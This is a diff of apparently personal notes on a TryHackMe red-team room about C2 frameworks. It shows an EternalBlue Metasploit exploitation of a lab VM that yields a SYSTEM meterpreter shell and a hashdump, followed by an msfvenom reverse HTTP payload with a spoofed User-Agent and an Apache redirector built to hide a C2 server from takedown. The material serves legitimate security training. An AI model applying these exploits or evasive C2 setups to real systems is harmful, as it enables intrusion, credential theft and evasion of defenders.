-Now that you have learned how to exploit hosts using Armitage, you will now get to practice your skills by hacking the virtual machine by usingÂ MetasploitÂ and Armitage. There are multiple exploit paths that you may be able to follow. We encourage you to explore the various exploit paths you may be able to find in order to gain a better understanding of exploitation and post-exploitation modules inÂ MetasploitÂ and Armitage. As a reminder, Armitage is justÂ MetasploitÂ with aÂ GUI; all the same exploits exist and are categorized the same way.
+Now that you have learned how to exploit hosts using Armitage, you will now get to practice your skills by hacking the virtual machine by using Metasploit and Armitage. There are multiple exploit paths that you may be able to follow. We encourage you to explore the various exploit paths you may be able to find in order to gain a better understanding of exploitation and post-exploitation modules in Metasploit and Armitage. As a reminder, Armitage is just Metasploit with a GUI; all the same exploits exist and are categorized the same way.
 
-  
+ 
 
 #### Solution
 
-If you are having difficulties with compromising the machine, here's a step-by-step guide to compromise theÂ VMÂ withÂ Metasploit. If you would like to use Armitage, use thisÂ [guide that shows step-by-step](https://drive.google.com/file/d/1u-YmWl7cx3tO2vVjon0EtOGLXVCak2SJ/view?usp=sharing)Â instructions. Now ontoÂ Metasploit!  
-  
-Our first step is to launchÂ Metasploit:  
+If you are having difficulties with compromising the machine, here's a step-by-step guide to compromise the VM with Metasploit. If you would like to use Armitage, use this [guide that shows step-by-step](https://drive.google.com/file/d/1u-YmWl7cx3tO2vVjon0EtOGLXVCak2SJ/view?usp=sharing) instructions. Now onto Metasploit! 
+ 
+Our first step is to launch Metasploit: 
 
 LaunchingMetasploitand using Eternal Blue!
 
@@ -853,8 +827,8 @@ msf5 exploit(windows/smb/ms17_010_eternalblue) > run
 
 [*] Started reverse TCP handler on ATTACKER_IP:4444 
 [*] VICTIM_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
-[+] VICTIM_IP:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)
-[*] VICTIM_IP:445      - Scanned 1 of 1 hosts (100% complete)
+[+] VICTIM_IP:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)
+[*] VICTIM_IP:445 - Scanned 1 of 1 hosts (100% complete)
 [*] VICTIM_IP:445 - Connecting to target for exploitation.
 [+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
@@ -863,7 +837,7 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-Now that we have exploited the Virtual Machine and have achieved System level access, we can use the hashdump command to retrieve the usersÂ NTLMÂ hashes:
+Now that we have exploited the Virtual Machine and have achieved System level access, we can use the hashdump command to retrieve the users NTLM hashes:
 
 Running Hashdump
 
@@ -896,57 +870,57 @@ And that's all there is to it! You have successfully compromised Ted's PC.
 Let's proceed in a different way, to begin with, we can start with a scan:
 
 ```
-PORT      STATE SERVICE      REASON  VERSION
-135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
-139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds syn-ack Windows 7 Home Basic 7600 microsoft-ds (workgroup: WORKGROUP)
-49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49158/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49159/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49160/tcp open  msrpc        syn-ack Microsoft Windows RPC
+PORT STATE SERVICE REASON VERSION
+135/tcp open msrpc syn-ack Microsoft Windows RPC
+139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn
+445/tcp open microsoft-ds syn-ack Windows 7 Home Basic 7600 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open msrpc syn-ack Microsoft Windows RPC
+49153/tcp open msrpc syn-ack Microsoft Windows RPC
+49154/tcp open msrpc syn-ack Microsoft Windows RPC
+49158/tcp open msrpc syn-ack Microsoft Windows RPC
+49159/tcp open msrpc syn-ack Microsoft Windows RPC
+49160/tcp open msrpc syn-ack Microsoft Windows RPC
 Service Info: Host: TEDS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | nbstat: NetBIOS name: TEDS-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:1e:31:74:f8:29 (unknown)
 | Names:
-|   TEDS-PC<00>          Flags: <unique><active>
-|   WORKGROUP<00>        Flags: <group><active>
-|   TEDS-PC<20>          Flags: <unique><active>
-|   WORKGROUP<1e>        Flags: <group><active>
-|   WORKGROUP<1d>        Flags: <unique><active>
-|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+| TEDS-PC<00> Flags: <unique><active>
+| WORKGROUP<00> Flags: <group><active>
+| TEDS-PC<20> Flags: <unique><active>
+| WORKGROUP<1e> Flags: <group><active>
+| WORKGROUP<1d> Flags: <unique><active>
+| \x01\x02__MSBROWSE__\x02<01> Flags: <group><active>
 | Statistics:
-|   02:1e:31:74:f8:29:00:00:00:00:00:00:00:00:00:00:00
-|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
-|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| 02:1e:31:74:f8:29:00:00:00:00:00:00:00:00:00:00:00
+| 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_ 00:00:00:00:00:00:00:00:00:00:00:00:00:00
 | smb2-security-mode:
-|   2:1:0:
-|_    Message signing enabled but not required
+| 2:1:0:
+|_ Message signing enabled but not required
 |_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s
 | p2p-conficker:
-|   Checking for Conficker.C or higher...
-|   Check 1 (port 37908/tcp): CLEAN (Couldn't connect)
-|   Check 2 (port 17981/tcp): CLEAN (Couldn't connect)
-|   Check 3 (port 58656/udp): CLEAN (Timeout)
-|   Check 4 (port 49358/udp): CLEAN (Failed to receive data)
-|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| Checking for Conficker.C or higher...
+| Check 1 (port 37908/tcp): CLEAN (Couldn't connect)
+| Check 2 (port 17981/tcp): CLEAN (Couldn't connect)
+| Check 3 (port 58656/udp): CLEAN (Timeout)
+| Check 4 (port 49358/udp): CLEAN (Failed to receive data)
+|_ 0/4 checks are positive: Host is CLEAN or ports are blocked
 | smb-os-discovery:
-|   OS: Windows 7 Home Basic 7600 (Windows 7 Home Basic 6.1)
-|   OS CPE: cpe:/o:microsoft:windows_7::-
-|   Computer name: Teds-PC
-|   NetBIOS computer name: TEDS-PC\x00
-|   Workgroup: WORKGROUP\x00
-|_  System time: 2025-05-12T13:59:20-04:00
+| OS: Windows 7 Home Basic 7600 (Windows 7 Home Basic 6.1)
+| OS CPE: cpe:/o:microsoft:windows_7::-
+| Computer name: Teds-PC
+| NetBIOS computer name: TEDS-PC\x00
+| Workgroup: WORKGROUP\x00
+|_ System time: 2025-05-12T13:59:20-04:00
 | smb-security-mode:
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: disabled (dangerous, but default)
 | smb2-time:
-|   date: 2025-05-12T17:59:20
-|_  start_date: 2025-05-12T17:57:49
+| date: 2025-05-12T17:59:20
+|_ start_date: 2025-05-12T17:57:49
 ```
 
 
@@ -980,53 +954,48 @@ THM{217fa45e35f8353ffd04cfc0be28e760}
 
 ### There's Always Room for Improvement
 
-As you may have guessed,Â MetasploitÂ itself is not that great of aÂ C2Â server for advanced adversary operations. It's not as flexible as one would desire; you cannot configure agents to beacon out every X seconds with Y jitter. A Next-GenerationÂ FirewallÂ could quickly pick up on thisÂ C2Â traffic, seeing it's a constant stream of traffic.Â In addition, anyone could connect to anÂ HTTP/HTTPS listener and find out relatively quickly what is going on.
+As you may have guessed, Metasploit itself is not that great of a C2 server for advanced adversary operations. It's not as flexible as one would desire; you cannot configure agents to beacon out every X seconds with Y jitter. A Next-Generation Firewall could quickly pick up on this C2 traffic, seeing it's a constant stream of traffic. In addition, anyone could connect to an HTTP/HTTPS listener and find out relatively quickly what is going on.
 
-  
+ 
 
-### Command and Control RedirectorsÂ 
+### Command and Control Redirectors **What is a Redirector?**
 
-**What is a Redirector?**
+Before we dive into configuring a Redirector, first, what is it? A Redirector is exactly as it sounds. It's a server that "Redirects" HTTP/HTTPS requests based on information within the HTTP Request body. In production systems, you may see a "Redirector" in the form of a Load Balancer. This server often runs Apache 2 or NGINX. For this lab, we will be leveraging Apache and some of its modules to build a Redirector.
 
-Before we dive into configuring a Redirector, first, what is it?Â A Redirector is exactly as it sounds. It's a server that "Redirects"Â HTTP/HTTPS requests based on information within theÂ HTTPÂ Request body. In production systems, you may see a "Redirector" in the form of a Load Balancer. This server often runsÂ ApacheÂ 2 or NGINX. For this lab, we will be leveragingÂ ApacheÂ and some of its modules to build a Redirector.
+ 
 
-  
+Jumping back into Metasploit, we can set up some basic configurations on Metasploit to allow for more advanced configurations, in this task; we will be setting up a Redirector. Usually, this configuration is set up on multiple hosts; the purpose of this is to hide the true Command and Control server. The diagram below illustrates how communications between a victim and a C2 server happen.
 
-Jumping back intoÂ Metasploit, we can set up some basic configurations onÂ MetasploitÂ to allow for more advanced configurations, in this task; we will be setting up a Redirector. Usually, this configuration is set up on multiple hosts; the purpose of this is to hide the true Command and Control server. The diagram below illustrates how communications between a victim and aÂ C2Â server happen.
+ 
 
-  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/c38457eb8f35b56a630d1e1b9f2bc75f.png) 
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/c38457eb8f35b56a630d1e1b9f2bc75f.png)  
+_Illustration of a C2 and Redirector with victims calling back_
 
-_Illustration of aÂ C2Â and Redirector with victims calling back_
+ 
 
-  
+Usually, when you have a C2 callback, you may set the callback host to a Domain, let's say admin.tryhackme.com. It's very common for your C2 Server to get reported, when a user files a complaint. Usually, the server gets taken down fairly quickly. It can sometimes be as little as 3 hours and as much as 24. Setting up a redirector ensures that any information you may have collected during the engagement is safe and sound. But how does this stop the C2 Server from being taken down? Surely if someone fingerprinted Cobalt Strike on your C2 Server, someone would file a complaint, and it would get taken down. This is true, so you should set up a Firewall to only allow communication to and from your redirector(s) to mitigate any potential risks.
 
-Usually, when you have aÂ C2Â callback, you may set the callback host to a Domain, let's say admin.tryhackme.com. It's very common for yourÂ C2Â Server to get reported, when a user files a complaint. Usually, the server gets taken down fairly quickly. It can sometimes be as little as 3 hours and as much as 24. Setting up a redirector ensures that any information you may have collected during the engagement is safe and sound.Â 
+ 
 
-  
-But how does this stop theÂ C2Â Server from being taken down? Surely if someone fingerprinted Cobalt Strike on yourÂ C2Â Server, someone would file a complaint, and it would get taken down. This is true, so you should set up aÂ FirewallÂ to only allow communication to and from your redirector(s) to mitigate any potential risks.
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/3ac046c94e8d8be64015641690f5e8a7.png) 
 
-  
-
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/3ac046c94e8d8be64015641690f5e8a7.png)  
-
-_Illustration of how aÂ C2Â Server and a Redirector should interact_
+_Illustration of how a C2 Server and a Redirector should interact_
 
 **How is a Redirector Setup?**
 
-Before we dive into configuring a redirector, we must first understand how one is set up; we will beÂ aligningÂ this to the tools we haveÂ available, which areÂ MetasploitÂ and Apache2. InÂ Apache, we will be leveraging a module called "mod_rewrite" (or the Rewrite module). This module allows us to write rules to forward requests to internal or external hosts on a server based on specificÂ HTTPÂ headers or content. We will need to use several modules to configure our Redirector. The following modules must be enabled:
+Before we dive into configuring a redirector, we must first understand how one is set up; we will be aligning this to the tools we have available, which are Metasploit and Apache2. In Apache, we will be leveraging a module called "mod_rewrite" (or the Rewrite module). This module allows us to write rules to forward requests to internal or external hosts on a server based on specific HTTP headers or content. We will need to use several modules to configure our Redirector. The following modules must be enabled:
 
 - rewrite
 - proxy
 - proxy_http
 - headers
 
-_Note: If you are using the Attack Box, there is already a service running on port 80 - you must change the default port thatÂ ApacheÂ listens on in /etc/apache2/ports.conf. You must do this before starting theÂ ApacheÂ 2 service, or it will fail to start._
+_Note: If you are using the Attack Box, there is already a service running on port 80 - you must change the default port that Apache listens on in /etc/apache2/ports.conf. You must do this before starting the Apache 2 service, or it will fail to start._
 
-You can installÂ apacheÂ 2 and enable it with the following commands:
+You can install apache 2 and enable it with the following commands:
 
-  
+ 
 
 **Enabling Modules and Starting Apache2
 
@@ -1034,21 +1003,21 @@ You can installÂ apacheÂ 2 and enable it with the following commands:
 
 root@kali$ apt install apache2
 Reading package lists... Done
-Building dependency tree       
+Building dependency tree 
 Reading state information... Done
 The following packages were automatically installed and are no longer required:
-  python-bs4 python-chardet python-dicttoxml python-dnspython python-html5lib
-  python-jsonrpclib python-lxml python-mechanize python-olefile python-pypdf2
-  python-slowaes python-webencodings python-xlsxwriter
+ python-bs4 python-chardet python-dicttoxml python-dnspython python-html5lib
+ python-jsonrpclib python-lxml python-mechanize python-olefile python-pypdf2
+ python-slowaes python-webencodings python-xlsxwriter
 Use 'apt autoremove' to remove them.
 The following additional packages will be installed:
-  apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
-  libaprutil1-ldap
+ apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
+ libaprutil1-ldap
 Suggested packages:
-  apache2-doc apache2-suexec-pristine | apache2-suexec-custom
+ apache2-doc apache2-suexec-pristine | apache2-suexec-custom
 The following NEW packages will be installed
-  apache2 apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
-  libaprutil1-ldap
+ apache2 apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
+ libaprutil1-ldap
 0 to upgrade, 6 to newly install, 0 to remove and 416 not to upgrade.
 
 Processing triggers for systemd (237-3ubuntu10.42) ...
@@ -1059,40 +1028,36 @@ Processing triggers for ureadahead (0.100.0-21) ...
 root@kali$ a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
 Enabling module rewrite.
 To activate the new configuration, you need to run:
-  systemctl restart apache2
+ systemctl restart apache2
 Enabling module proxy.
 To activate the new configuration, you need to run:
-  systemctl restart apache2
+ systemctl restart apache2
 Enabling module proxy_http.
 To activate the new configuration, you need to run:
-  systemctl restart apache2
+ systemctl restart apache2
 Enabling module headers.
 To activate the new configuration, you need to run:
-  systemctl restart apache2
+ systemctl restart apache2
 
 â— apache2.service - The Apache HTTP Server
-     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
-     Active: active (running) since Thu 2022-02-10 23:17:08 EST; 7ms ago
-       Docs: https://httpd.apache.org/docs/2.4/
-    Process: 4149 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
-   Main PID: 4153 (apache2)
-      Tasks: 1 (limit: 19072)
-     Memory: 6.0M
-        CPU: 19ms
-     CGroup: /system.slice/apache2.service
-             â””â”€4153 /usr/sbin/apache2 -k start
+ Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
+ Active: active (running) since Thu 2022-02-10 23:17:08 EST; 7ms ago
+ Docs: https://httpd.apache.org/docs/2.4/
+ Process: 4149 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
+ Main PID: 4153 (apache2)
+ Tasks: 1 (limit: 19072)
+ Memory: 6.0M
+ CPU: 19ms
+ CGroup: /system.slice/apache2.service
+ â””â”€4153 /usr/sbin/apache2 -k start
 ```
 
 
-  
+ 
 
-UsingÂ Meterpreter, we have the ability to configure various aspects of theÂ HTTPÂ Request, for example, the User-Agent. It is very common for a threat actor to make a slight adjustment to the User-Agent in theirÂ C2Â HTTP/HTTPS payloads. It's in everyÂ HTTPÂ request, and they all more or less look the same, and there is a very good chance a security analyst may overlook a modified user agent string. For this demonstration, we will generate aÂ MeterpreterÂ ReverseÂ HTTPÂ payload using MSFvenom; then we will inspect theÂ HTTPÂ request in Wireshark.Â 
+Using Meterpreter, we have the ability to configure various aspects of the HTTP Request, for example, the User-Agent. It is very common for a threat actor to make a slight adjustment to the User-Agent in their C2 HTTP/HTTPS payloads. It's in every HTTP request, and they all more or less look the same, and there is a very good chance a security analyst may overlook a modified user agent string. For this demonstration, we will generate a Meterpreter Reverse HTTP payload using MSFvenom; then we will inspect the HTTP request in Wireshark. **Generating a Payload with Modified Headers -**
 
-  
-
-**Generating a Payload with Modified Headers -**
-
-  
+ 
 
 Generating a ModifiedHTTPPayload withMeterpreter
 
@@ -1106,50 +1071,48 @@ Final size of exe file: 73802 bytes
 Saved as: shell.exe
 ```
 
-After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use theÂ `HTTP`Â filter to only viewÂ HTTPÂ requests. After it's started capturing packets, execute the binary on the victim system. You will notice anÂ HTTPÂ request come in with our modified User-Agent.
+After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use the`HTTP` filter to only view HTTP requests. After it's started capturing packets, execute the binary on the victim system. You will notice an HTTP request come in with our modified User-Agent.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/b842ee1430892fa04c092531b9383f4f.png)
 
-_Packet Capture of the modifiedÂ HTTPÂ Payload with Meterpreter_
+_Packet Capture of the modified HTTP Payload with Meterpreter_
 
-Now that we have a field we can control in theÂ HTTPÂ Request, let's create an Apache2 mod_rewrite rule that filters on the user agent "NotMeterpreter" and forward it to our Metasploit C2 Server.
+Now that we have a field we can control in the HTTP Request, let's create an Apache2 mod_rewrite rule that filters on the user agent "NotMeterpreter" and forward it to our Metasploit C2 Server.
 
-Modifying the Apache Config File -Â 
-
-This section may sound intimidating but is actually quite easy; we will be taking the default Apache config and modifying it to our advantage. On Debian based systems, the default config can be found atÂ `/etc/apache2/sites-available/000-default.conf`.
+Modifying the Apache Config File - This section may sound intimidating but is actually quite easy; we will be taking the default Apache config and modifying it to our advantage. On Debian based systems, the default config can be found at`/etc/apache2/sites-available/000-default.conf`.
 
 Default Apache2 Config
 
 ```shell-session
-root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
+root@kali$ cat /etc/apache2/sites-available/000-default.conf | grep -v '#'
 <VirtualHost *:80>
 
-        ServerAdmin webmaster@localhost
-        DocumentRoot /var/www/html
+ ServerAdmin webmaster@localhost
+ DocumentRoot /var/www/html
 
-        <Directory>
-                AllowOverride All
-        </Directory>
+ <Directory>
+ AllowOverride All
+ </Directory>
 
-        ErrorLog ${APACHE_LOG_DIR}/error.log
-        CustomLog ${APACHE_LOG_DIR}/access.log combined
+ ErrorLog ${APACHE_LOG_DIR}/error.log
+ CustomLog ${APACHE_LOG_DIR}/access.log combined
 
 </VirtualHost>
 
 ```
 
-Now that we have a general idea of the Apache2 Config file is structured, we must add a few lines to the config file to enable the Rewrite Engine, add a rewrite condition, and lastly, pass through theÂ ApacheÂ 2Â Proxy. This sounds fairly complex, but it's quite simple.
+Now that we have a general idea of the Apache2 Config file is structured, we must add a few lines to the config file to enable the Rewrite Engine, add a rewrite condition, and lastly, pass through the Apache 2 Proxy. This sounds fairly complex, but it's quite simple.
 
-To enable theÂ [Rewrite Engine](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html), we must addÂ `RewriteEngine On`Â onto a new line in the VirtualHost section.
+To enable the [Rewrite Engine](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html), we must add`RewriteEngine On` onto a new line in the VirtualHost section.
 
-Now we will be using a Rewrite Condition targeting the HTTP User-Agent. For a complete list of HTTP Request Targets, see theÂ [mod_rewrite documentation](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html)Â on Apache.org. Because we only want to match the User-Agent "NotMeterpreter", we need to use some basic Regular Expressions to capture this; adding a ^ signals the beginning of a string and a $ at the end of the series, giving us with "NotMeterpreter". This Regex willÂ **only**Â capture the NotMeterpreter User-Agent. We can add this lineÂ `RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"`Â to our config to (as previously stated) only allowÂ HTTPÂ Requests with the NotMeterpreter user agent to accessÂ Metasploit.
+Now we will be using a Rewrite Condition targeting the HTTP User-Agent. For a complete list of HTTP Request Targets, see the [mod_rewrite documentation](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html) on Apache.org. Because we only want to match the User-Agent "NotMeterpreter", we need to use some basic Regular Expressions to capture this; adding a ^ signals the beginning of a string and a $ at the end of the series, giving us with "NotMeterpreter". This Regex will **only** capture the NotMeterpreter User-Agent. We can add this line`RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"` to our config to (as previously stated) only allow HTTP Requests with the NotMeterpreter user agent to access Metasploit.
 
-Lastly, we must forward the request through Apache2, through ourÂ proxy, toÂ Metasploit. To do this, we must use the ProxyPass feature ofÂ Apache'sÂ [mod_proxy module](https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html). To do this, we just need to specify the baseÂ URIÂ that the request will be forwarded to (in our case, we just need "/"), and the target we want to forward the request to. ThisÂ **will**Â vary from setup to set up, but this IP Address will be yourÂ C2Â server. In the lab scenario, it will be localhost and port thatÂ MetasploitÂ is listening on. This will give us a full config file that looks like so:
+Lastly, we must forward the request through Apache2, through our proxy, to Metasploit. To do this, we must use the ProxyPass feature of Apache's [mod_proxy module](https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html). To do this, we just need to specify the base URI that the request will be forwarded to (in our case, we just need "/"), and the target we want to forward the request to. This **will** vary from setup to set up, but this IP Address will be your C2 server. In the lab scenario, it will be localhost and port that Metasploit is listening on. This will give us a full config file that looks like so:
 
 Modified Apache2 Config
 
 ```shell-session
-root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
+root@kali$ cat /etc/apache2/sites-available/000-default.conf | grep -v '#'
 
 <VirtualHost *:80>
 
@@ -1171,13 +1134,13 @@ root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
 
 ```
 
-  
+ 
 
 **Setting Up Exploit/Multi/Handler**
 
-To set upÂ MeterpreterÂ properly, we need to make a few modifications; We must set our LHOST argument to the incoming interface that we are expecting connections from, in our lab; this will be 127.0.0.1. In the real world, this will be your public interface that your Redirector will be connecting to (aka your Public IP Address), and the LPORT will be whatever you like. For the lab, we will be usingÂ TCP/8080; this can be whatever you like in production. As always, the best practice is to run services over their standard protocols, soÂ HTTPÂ should run on port 80, and HTTPS should run on port 443. These options will also need to be duplicated for ReverseListenerBindAddress and ReverseListenerBindPort.
+To set up Meterpreter properly, we need to make a few modifications; We must set our LHOST argument to the incoming interface that we are expecting connections from, in our lab; this will be 127.0.0.1. In the real world, this will be your public interface that your Redirector will be connecting to (aka your Public IP Address), and the LPORT will be whatever you like. For the lab, we will be using TCP/8080; this can be whatever you like in production. As always, the best practice is to run services over their standard protocols, so HTTP should run on port 80, and HTTPS should run on port 443. These options will also need to be duplicated for ReverseListenerBindAddress and ReverseListenerBindPort.
 
-Next, we need to set up OverrideLHOST - This value will be your redirector's IP Address or Domain Name. After that, we need to set the OverrideLPORT; this will be the port that theÂ HTTPÂ _or_Â HTTPS is running on, on your Redirector. Lastly, we must set the OverrideRequestHost to true. This will makeÂ MeterpreterÂ respond with the OverrideHost information, so all queries go through the Redirector and not yourÂ C2Â server. Now that you understand what must be configured, let's dive into it:
+Next, we need to set up OverrideLHOST - This value will be your redirector's IP Address or Domain Name. After that, we need to set the OverrideLPORT; this will be the port that the HTTP _or_ HTTPS is running on, on your Redirector. Lastly, we must set the OverrideRequestHost to true. This will make Meterpreter respond with the OverrideHost information, so all queries go through the Redirector and not your C2 server. Now that you understand what must be configured, let's dive into it:
 
 MetasploitRedirector
 
@@ -1211,11 +1174,8 @@ msf6 exploit(multi/handler) > run
 
 ```
 
-After this has all been set up, running yourÂ MeterpreterÂ Reverse Shell should nowÂ proxyÂ all communications through your Redirector! For awareness, the diagram below is how our Redirector is set up in our lab; as a reminder, in engagements, you will want to useÂ **multiple**Â hosts andÂ DNSÂ records instead of IP Addresses.Â 
-
-Â ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/267a18249f3b9f9ad07e0b9e429bd942.png)
-Â 
-![Pasted image 20250512131444.png](../../../IMAGES/Pasted%20image%2020250512131444.png)
+After this has all been set up, running your Meterpreter Reverse Shell should now proxy all communications through your Redirector! For awareness, the diagram below is how our Redirector is set up in our lab; as a reminder, in engagements, you will want to use **multiple** hosts and DNS records instead of IP Addresses. ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/267a18249f3b9f9ad07e0b9e429bd942.png)
+ ![Pasted image 20250512131444.png](../../../IMAGES/Pasted%20image%2020250512131444.png)
 
 
 # Wrapping Up
@@ -1223,19 +1183,18 @@ After this has all been set up, running yourÂ MeterpreterÂ Reverse Shell sho
 
 ### Recap
 
-In this room, you hopefully learned a lot about Command and Control frameworks and will be able to take the knowledge you gained within this room and apply it in the real world. At the end of the day, almost everyone in Red Team Ops uses a Command and Control Framework. It's an essential part of every Red Teamer's toolkit, and we encourage you to go out and explore variousÂ C2Â frameworks that were not covered or mentioned in this room.
+In this room, you hopefully learned a lot about Command and Control frameworks and will be able to take the knowledge you gained within this room and apply it in the real world. At the end of the day, almost everyone in Red Team Ops uses a Command and Control Framework. It's an essential part of every Red Teamer's toolkit, and we encourage you to go out and explore various C2 frameworks that were not covered or mentioned in this room.
 
-  
+ 
 
-### How to Choose aÂ C2Â Framework
+### How to Choose a C2 Framework
 
-After finishing this room, you may be left with some questions, and hopefully, one of them is "How do I know whatÂ C2Â Framework to choose in my Red Team Operations". There is no right or wrong answer for this, just a few general questions that you should answer first:
+After finishing this room, you may be left with some questions, and hopefully, one of them is "How do I know what C2 Framework to choose in my Red Team Operations". There is no right or wrong answer for this, just a few general questions that you should answer first:
 
-- What are your goals?Â 
-- Do you have a budget?
+- What are your goals? - Do you have a budget?
 - Do you need something highly customizable?
-- Is off-the-shelfÂ AVÂ Evasion necessary?
+- Is off-the-shelf AV Evasion necessary?
 - Do you need the ability to create your own modules/scripts?
 - Is built-in reporting necessary for you?
 
-You should then take that information to theÂ [C2Â Matrix spreadsheet](https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0)Â and narrow your selection based on the questions above. If you find a PremiumÂ C2Â Framework that meets your criteria, it isÂ **highly**Â recommendedÂ you request an evaluation/trial to find out if thatÂ C2Â Framework works best for you.
+You should then take that information to the [C2 Matrix spreadsheet](https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0) and narrow your selection based on the questions above. If you find a Premium C2 Framework that meets your criteria, it is **highly** recommended you request an evaluation/trial to find out if that C2 Framework works best for you.
